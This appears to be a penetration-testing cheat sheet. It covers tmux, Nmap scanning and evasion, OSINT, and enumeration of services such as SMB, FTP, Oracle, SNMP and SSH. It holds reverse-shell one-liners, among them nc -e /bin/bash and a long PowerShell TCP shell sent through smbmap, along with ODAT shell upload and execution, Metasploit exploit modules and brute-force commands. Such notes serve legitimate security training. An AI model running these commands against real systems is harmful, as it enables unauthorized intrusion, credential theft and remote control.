# start/stop logging with tmux logger
prefix + [Shift + P]

# split tmux pane vertically
prefix + [Shift + %}

# split tmux pane horizontally
prefix + [Shift + "]

# switch between tmux panes
prefix + [Shift + O]
```

### Tmux Commands

```shell
ctrl b + w    # show windows
ctrl + "      # split window horizontal
ctrl + %      # split window vertical
ctrl + ,      # rename window
ctrl + {      # flip window
ctrl + }      # flip window
ctrl + spacebar    # switch pane layout
```

Copy & Paste
```shell
:setw -g mode-keys vi
ctrl b + [
space
enter
ctrl b + ]
```

Search
```shell
ctrl + /      # enter search while within copy mode for vi mode
n             # search next
shift + n     # reverse search
```

Logging
```shell
ctrl b
shift + P    # start / stop
```

Save Output
```shell
ctrl b + :
capture-pane -S -
save-buffer <FILE>.txt
```

## 2. Nmap

### Enumeration Methodology

Enumeration is iterative. Start with a fast scan, expand to all TCP ports, add UDP where relevant, then fingerprint each service and follow anomalies.

```bash
# Fast pass, then all ports
nmap -sC -sV -oA initial <TARGET_IP>
nmap -p- -sV -oA all_tcp <TARGET_IP>

# UDP top ports
sudo nmap -sU --top-ports 100 -oA udp <TARGET_IP>

# Scripts and version intensity
nmap -sC -sV --version-all -p <PORTS> <TARGET_IP>
```

Document each service, version, and banner; re-scan after changes. Correlate results with hostnames, virtual hosts, and certificates before moving to exploitation.

### Address Scanning

```
# Scan a single IP
nmap 192.168.1.1

# Scan multiple IPs
nmap 192.168.1.1 192.168.1.2

# Scan a range
nmap 192.168.1.1-254

# Scan a subnet
nmap 192.168.1.0/24
```

### Scan Techniques

```
# TCP SYN port scan (Default)
nmap -sS 192.168.1.1

# TCP connect port scan (Default without root privilege)
nmap -sT 192.168.1.1

# UDP port scan
nmap -sU 192.168.1.1

# TCP ACK port scan
nmap  -sA 192.168.1.1
```

### Host Discovery

```
# Disable port scanning. Host discovery only.
nmap -sn 192.168.1.1

# Disable host discovery. Port scan only.
nmap -Pn 192.168.1.1

# Never do DNS resolution
nmap -n 192.168.1.1

```

```shell
ping -c 1 <RHOST>
ping -n 1 <RHOST>
```

### Port Scanning

```
# Port scan from service name
nmap 192.168.1.1 -p http,https

# Specific port scan
nmap 192.168.1.1 -p 80,9001,22

# All ports
nmap 192.168.1.1 -p-

# Fast scan 100 ports
nmap -F 192.168.1.1

# Scan top ports
nmap 192.168.1.1 --top-ports 200
```

```shell
sudo nmap -p- <RHOST> --min-rate 10000 -vvv
sudo nmap -sC -sV -p- <RHOST>
sudo nmap -sV -sU <RHOST>
sudo nmap -sC -sV --script vuln <RHOST>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```

```shell
for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
```

```shell
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

```shell
for i in $(seq 1 254); do nc -zv -w 1 <XXX.XXX.XXX>.$i <RPORT>; done
```

### OS & Service Detection

```
# Aggressive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
nmap -A 192.168.1.1

# Version detection scanning
nmap -sV 192.168.1.1

# Version detection intensity from 0-9
nmap -sV --version-intensity 7 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Hard OS detection intensity
nmap -O --osscan-guess 192.168.1.1
```

### Timing & Performance

```
# Paranoid (0) Intrusion Detection System evasion
nmap 192.168.1.1 -T0

# Insane (5) speeds scan; assumes you are on an extraordinarily fast network
nmap 192.168.1.1 -T5

# Send packets no slower than <number> per second
nmap 192.168.1.1 --min-rate 1000
```

### NSE Scripts

```
# Scan with a single script. Example banner
nmap 192.168.1.1 --script=banner

# NSE script with arguments
nmap 192.168.1.1 --script=banner --script-args <arguments>
```

### Firewall Evasion & Spoofing

```
# Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
nmap -f 192.168.1.1

# Set your own offset size(8, 16, 32, 64)
nmap 192.168.1.1 --mtu 32

# Send scans from spoofed IPs, or you can generate random 5 IPs via this option -D RND:5
nmap 192.168.1.1 -D 192.168.1.11,192.168.1.12,192.168.1.13
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5

# -S 	Scans the target by using different source IP address | -O for operating system | -e to scan from specific Ethernet
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0

# --source-port 53 	Performs the scans from specified source port | or You Can Connect To The Filtered Port
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
ncat -nv --source-port 53 10.129.2.28 50000 |or| nc -nv -p 53 10.129.2.47 50000

# -sA 	Performs ACK scan on specified ports.
sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
```

### Output

```
# Normal output to the file normal.file
nmap 192.168.1.1 -oN scan.txt

# Output in the three major formats at once
nmap 192.168.1.1 -oA scan
```

### Recon Commands

```
# Enumerate subnet
nmap -sn 10.11.1.1/24

# Full complete slow scan with output
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full 10.11.1.111

# Autorecon
python3 autorecon.py 10.11.1.111

# NmapAutomator
nmapAutomator.sh -H 192.168.86.125 -t All

#Scan All the ports:
masscan -p1-65535,U:1-65535 --rate=1000 192.168.232.43 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
sudo nmap -Pn -sV -sC -p$ports 192.168.232.43

# OneTwoPunch
https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh
onetwopunch.sh ip.txt tcp

# Scan for UDP
nmap 10.11.1.111 -sU
unicornscan -mU -v -I 10.11.1.111

# Connect to udp if one is open
nc -u 10.11.1.111 48772

# Amass
amass enum -ip 10.11.1.1/24
```
- sparta
- `python /root/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.11.1.111 -o test --services`

## 3. Service Footprinting

### Infrastructure & OSINT Enumeration

```
# Certificate transparency | to gather all subdomains for a corporate/company
curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .

# Scan each IP address in a list using Shodan.
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

### Domain, Cloud & Staff Enumeration

Use an iterative methodology: identify the layer you are in (internet, DMZ, internal, restricted), enumerate broadly, then dig into anomalies.

```bash
# Domain and certificate transparency
whois <DOMAIN>
dig any <DOMAIN>
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq .
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq . | grep name |
  cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 |
  awk '{gsub(/\\n/,"\n");}1;' | sort -u

# Resolve discovered subdomains and collect IPs
for i in $(cat subdomains.txt); do host "$i" | grep "has address"; done
for i in $(cat subdomains.txt); do host "$i" | grep "has address" | awk '{print $4}'; done |
  sort -u > ip-addresses.txt

# Enrich with Shodan
for i in $(cat ip-addresses.txt); do shodan host "$i"; done
```

Cloud resource checks:

```bash
# AWS S3 / GCP Storage / Azure Blob naming patterns
aws s3 ls s3://<BUCKET> --no-sign-request
gsutil ls gs://<BUCKET>
curl -s https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list
```

Look for public storage buckets, exposed CI/CD artifacts, and cloud-hosted subdomains. Use search engines for `site:s3.amazonaws.com <COMPANY>`, `site:blob.core.windows.net <COMPANY>`, and `site:storage.googleapis.com <COMPANY>`.

Staff and OSINT:

- Company website, LinkedIn, job postings, GitHub/GitLab, social media.
- Email format discovery (`first.last@`, `flast@`, etc.).
- `theHarvester`, `hunter.io`, breach data, and public paste sites.
- Usernames and email addresses feed password spraying and phishing simulations.

### FTP (21/tcp)

```
# Connect to FTP
ftp <IP>
ftp 10.129.203.6 -p 2121

# Interact with a service on the target.
nc -nv <IP> <PORT>

# Download all available files on the target FTP server
wget -m --no-passive ftp://<USERNAME>:<PASSWORD>@<IP>

# Using nmap
sudo nmap --script-updatedb
find / -type f -name ftp* 2>/dev/null | grep scripts

# Using openssl, in case ftp use TLS/SSL
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

```shell
ftp <RHOST>
ftp -A <RHOST>
wget -r ftp://<USERNAME>:<PASSWORD>@<RHOST>
```

(https://book.hacktricks.xyz/pentesting/pentesting-ftp)
```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111
USER anonymous / admin / found username
PASS anonymous / admin / found username
Try:
  get put (*.aspx,*.asp,*.php)
```

### MSRPC (135/tcp)

```
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

Some versions are vulnerable.

```
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

### SMB (139, 445/tcp)

```
# Connect to a specific SMB share | -L for display all files | and - N  for null session (-N), which is anonymous access
smbclient //<FQDN/IP>/<share>

# Interaction with the target using RPC | Query = `srvinfo` or `enumdomains` or `querydominfo` or `netshareenumall` or `netsharegetinfo <share>` or `enumdomusers` or `queryuser <RID>`
rpcclient -U "" <FQDN IP>

# Brute Forcing User RIDs
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# we can brute force for user rids also via Impacket - Samrdump.py
samrdump.py 10.129.14.128

# using smbmap
smbmap -H 10.129.14.128

# using Enum4Linux-ng
 ./enum4linux-ng.py 10.129.14.128 -A

# Enumerating SMB shares using null session authentication.
crackmapexec smb <FQDN/IP> --shares -u '' -p ''
```

```shell
mount.cifs //<RHOST>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
```

```shell
smbclient -L \\<RHOST>\ -N
smbclient -L //<RHOST>/ -N
smbclient -L ////<RHOST>/ -N
smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
smbclient //<RHOST>/<SHARE>
smbclient //<RHOST>/<SHARE> -U <USERNAME>
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
smbclient "\\\\<RHOST>\<SHARE>"
smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<RHOST>/<SHARE>
```

#### Download multiple files at once

```shell
mask""
recurse ON
prompt OFF
mget *
```

```shell
rpcclient -U "" <RHOST>
```

```shell
dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2
dsr_getsitename
enumdata
enumdomgroups
enumdomusers
enumjobs
enumports
enumprivs
getanydcname
getdcname
lookupsids
lsaenumsid <SID>
lsaquery
netconnenum
netdiskenum
netfileenum
netsessenum
netshareenum
netshareenumall
netsharegetinfo
queryuser <USERNAME>
srvinfo
```

```shell
smbpasswd -r <RHOST> -U <USERNAME>
```

```
# Enum hostname
enum4linux -n 10.11.1.111
nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111

# Get Version
smbver.sh 10.11.1.111
Msfconsole;use scanner/smb/smb_version
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]'
smbclient -L \\\\10.11.1.111

# Get Shares
smbmap -H  10.11.1.111 -R <sharename>
sudo smbmap -H 10.11.1.136 -R --download "Bob Share\Draft Contract Mr. Yamamoto.txt" # Connect to a share with a space & download files
echo exit | smbclient -L \\\\10.11.1.111
smbclient \\\\10.11.1.111\\<share>
smbclient -L //10.11.1.111 -N
nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111
smbclient -L \\\\10.11.1.111\\

smbclient //10.11.1.111/IPC$ -N

# Exploit null sessions
enum -s 10.11.1.111
enum -U 10.11.1.111
enum -P 10.11.1.111
enum4linux -a 10.11.1.111
/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111

# Connect to username shares
smbclient //10.11.1.111/share -U username

# Connect with a user and password
smbclient -U "fox%<PASSWORD>"  //192.168.123.157/

smbclient //10.11.1.111/<share>
smbclient //10.11.1.111/<share\ name>
smbclient //10.11.1.111/<""share name"">
rpcclient -U " " 10.11.1.111
rpcclient -U " " -N 10.11.1.111

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111

# Check common security concerns
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc

# Extra validation
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc

# Multi exploits
msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run

# Bruteforce login
medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvv
nmap –script smb-brute 10.11.1.111

# nmap smb enum & vuln
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

# Mount smb volume linux
mount -t cifs -o username=user,password=<PASSWORD> //x.x.x.x/share /mnt/share

# Run cmd over smb from linux
winexe -U username //10.11.1.111 "cmd.exe" --system

#smb reverse shell with "logon" cmd
logon "/=`nc 10.10.14.5 4444 -e /bin/bash`"

# smbmap
smbmap.py -H 10.11.1.111 -u administrator -p <PASSWORD> #Enum
smbmap.py -u username -p '<PASSWORD>' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H 10.11.1.111 #RCE
smbmap.py -H 10.11.1.111 -u username -p '<PASSWORD>' -L # Drive Listing
smbmap.py -u username -p '<PASSWORD>' -d ABC -H 10.11.1.111 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' # Reverse Shell

# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "
```

### Rpcbind (111/tcp)

```
rpcinfo -p 10.11.1.111  # enum NFS shares
showmount -e 10.11.1.111
mount -t nfs 10.11.1.111:/ /mnt -o nolock     # mount remote share to your local machine

rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
```

```
rpcinfo -p 10.11.1.111  # enum NFS shares
mount -t nfs 10.11.1.111:/ /mnt -o nolock     # mount remote share to your local machine

	getdompwinfo
	querydominfo
```

### NFS (2049/tcp)

```
# Via nmap
 sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
```

```shell
sudo mount -t nfs -o vers=4,nolock <RHOST>:/<FOLDER> /PATH/TO/FOLDER/<FOLDER>
```

```shell
/usr/sbin/showmount -e <RHOST>
sudo showmount -e <RHOST>
chown root:root sid-shell; chmod +s sid-shell
```

```
If you find anything you can mount it like this:

mount 10.11.1.111:/ /tmp/NFS
mount -t 10.11.1.111:/ /tmp/NFS
```

### DNS (53/tcp, 53/udp)

```
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver. | if you found a sub domain internally you can use this option dig axfr internal.domain.tld @<nameserver>
dig axfr <domain.tld> @<nameserver>

# Subdomain Brute Forcing
> for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

> dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
> dnsenum --enum inlanefreight.com -f /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt --threads 20 --noreverse --nodnsserver --noreport --nocolor -r
```

### SMTP (25/tcp)

```
# NS request to the specific nameserver. | `AUTH PLAIN` or `HELO` or `CONNECT 10.129.14.128:25 HTTP/1.0` when dealing with proxy or `MAIL FROM` or `RCPT TO` or `DATA` or `RSET` or `VRFY` or `EXPN` or `NOOP` or `QUIT`
telnet <ip> 25

# to enum a list of users
smtp-user-enum -M VRFY -U /home/kali/Downloads/footprinting-wordlist.txt -t 10.129.152.94 -w 120 -p 25 -v
```

https://book.hacktricks.xyz/pentesting/pentesting-smtp#basic-information

REF:Postfish
```
nc -nvvC 10.11.1.111 25
HELO foo<cr><lf>

VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111

# Enumerate SMTP Users
sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.1.1.65

Send email unauth:

MAIL FROM:<EMAIL>
RCPT TO:<EMAIL>
DATA
test

.

Receive:
250 OK
```

### IMAP & POP3 (143/993, 110/995/tcp)

```
# Log in to the IMAPS service using cURL | `-k` or `-v`
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

# Connect to the IMAPS service | there are multiple IMAP Commands you need to search about it https://www.atmail.com/blog/imap-101-manual-imap-sessions/
openssl s_client -connect <FQDN/IP>:imaps

# Connect to the POP3s service | there are multiple IMAP Commands you need to search about it
openssl s_client -connect <FQDN/IP>:pop3s
```

```
telnet 10.11.1.111
USER pelle@10.11.1.111
PASS admin

or:

USER pelle

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

REF: Postfish

Banner Grab
```
telnet 10.11.1.111 143 #Connect to read emails

openssl s_client -connect 10.11.1.111:993 -quiet  #Encrypted connection
```

### SNMP (161/udp)

```
# Querying OIDs using snmpwalk
snmpwalk -v2c -c <community string> <FQDN/IP>

# Bruteforcing community strings of the SNMP service. | you can guess community-string by fuzzing via /opt/useful/seclists/Discovery/SNMP/snmp.txt list
onesixtyone -c community-strings-fuzzing.list <FQDN/IP>

# Bruteforcing SNMP service OIDs.
braa <community string>@<FQDN/IP>:.1.*
```

```shell
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
```

```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
snmp-check 10.11.1.111 -c public|private|community
```

### MySQL (3306/tcp)

```
mysql -u <user> -p<password> -h <FQDN/IP>
SELECT @@version_compile_os
```

https://book.hacktricks.xyz/pentesting/pentesting-mysql#basic-information

```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306

mysql --host=10.11.1.111 -u root -p

MYSQL UDF
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

### MSSQL (1433/tcp)

```
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
mssqlclient.py -p 1433 julio@10.129.203.7
sqlcmd -S SRVMSSQL -U julio -P '<PASSWORD>' -y 30 -Y 30
sqsh -S 10.129.203.7 -U .\\julio -P '<PASSWORD>' -h   # Linux client

```

```
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
sqsh -S 10.11.1.111 -U sa
	xp_cmdshell 'date'
	go
```

### Oracle TNS (1521/tcp)

```
# using nmap
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# using odat tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components.
./odat.py all -s 10.129.204.235

# using SQLplus - to Access/Log In | if you receive an error go to https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
sqlplus <username>/<password>@<IP>/XE
sqlplus <username>/<password>@<IP>/XE as sysdba

# Oracle RDBMS - Interaction
> select table_name from all_tables; | > select * from user_role_privs; | > select name, password from sys.user$;

# Oracle RDBMS - File Upload
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P <PASSWORD> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.204.235/testing.txt
```

```
oscanner -s 10.11.1.111 -P 1521
tnscmd10g version -h 10.11.1.111
tnscmd10g status -h 10.11.1.111
nmap -p 1521 -A 10.11.1.111
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
MSF: good modules under auxiliary/admin/oracle and scanner/oracle

./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE

Upload reverse shell with ODAT:
./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P <PASSWORD> -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe

and run it:
./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P <PASSWORD> -d XE --sysdba --exec c:/ shell.exe
```

```
FTP:
	sys:sys
	scott:tiger
```

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm

- Basic info about web service (apache, nginx, IIS)

### IPMI (623/udp)

```
# Using nmap
sudo nmap -sU --script ipmi-version -p 623 domain.local

# IPMI version detection
msf6 use auxiliary/scanner/ipmi/ipmi_version

# Dump IPMI hashes
msf6 use auxiliary/scanner/ipmi/ipmi_dumphashes
```

### Remote Management

```bash
# SSH (22/tcp)
./ssh-audit.py <IP>
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password   # force password auth
ssh -i ./id_rsa <username>@<IP>                              # force key auth; chmod 600 ./id_rsa first

# Rsync (873/tcp)
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev-folder

# R-services (512, 513, 514/tcp)
rcp
rexec
rlogin
rsh
rstat
rwho
rusers -al

# RDP (3389/tcp)
nmap -sV -sC <IP> -p3389 --script rdp*
./rdp-sec-check.pl <IP>
xfreerdp /u:<username> /p:"<password>" /v:<IP> /cert:ignore /dynamic-resolution /drive:share,<LOCAL_PATH>

# WinRM (5985 HTTP, 5986 HTTPS)
# Windows: Test-WsMan
evil-winrm -i 10.129.201.248 -u <username> -p <password>

# WMI (135/tcp)
python3-impacket/examples/wmiexec.py username:"<PASSWORD>"@<IP> "hostname"
```

```shell
xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +dynamic-resolution +clipboard
xfreerdp3 /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' +dynamic-resolution +clipboard
xfreerdp3 /v:<RHOST> +dynamic-resolution +clipboard /tls:seclevel:0 /sec:nla:off
rdesktop <RHOST>
```

#### Using outdated Algorithms

```shell
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

#### Error Handling

#### Fixing SSH Private Key

```shell
dos2unix id_rsa
vim --clean id_rsa
chmod 600 id_rsa
```

```shell
dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 600 id_rsa
```

### Memcached (11211/tcp)

>  https://github.com/pd4d10/memcached-cli

```shell
memcrashed / 11211/UDP

npm install -g memcached-cli
memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

STAT pid 21357
STAT uptime 41557034
STAT time 1519734962

sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info

stats items
stats cachedump 1 0
get link
get file
get user
get passwd
get account
get username
get password
```

### NetBIOS

```shell
nbtscan <RHOST>
nmblookup -A <RHOST>
```

### SSH (22/tcp)

- If you have usernames test login with username:username
- Vulnerable Versions: 7.2p1

```
Vulnerable Versions: 7.2p1
nc 10.11.1.111 22

User can ask to execute a command right after authentication before it’s default command or shell is executed

$ ssh -v user@10.10.1.111 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
debug1: channel 0: new [client-session]
debug1: Requesting <EMAIL>
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype <EMAIL> want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype <EMAIL> reply 0
<<<<<uid=1000(user) gid=100(users) groups=100(users)>>>>>
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

Check Auth Methods:

$ ssh -v 10.10.1.111
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
debug1: Authentications that can continue: publickey,password,keyboard-interactive

SSH via Non-Standard Port:

$ ssh -v 10.10.1.111 -p 43022

SSH no matching key exchange method found:

ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 bob@10.11.1.136

Force Auth Method:

$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
debug1: Next authentication method: password

SSH Login with id_rsa file:

$ ssh -i id_rsa fox@192.168.152.126

SSH via Git:

$ GIT_SSH_COMMAND='ssh -i id_rsa -o IdentitiesOnly=yes' git clone ssh://git@192.168.212.125:43022/git-server (non-standard port)

$ GIT_SSH_COMMAND='ssh -i ~/Proving_Grounds/Hunit/id_rsa -o IdentitiesOnly=yes' git push (Done from within the git repo)

BruteForce:

patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=<PASSWORD> -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access
Id
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
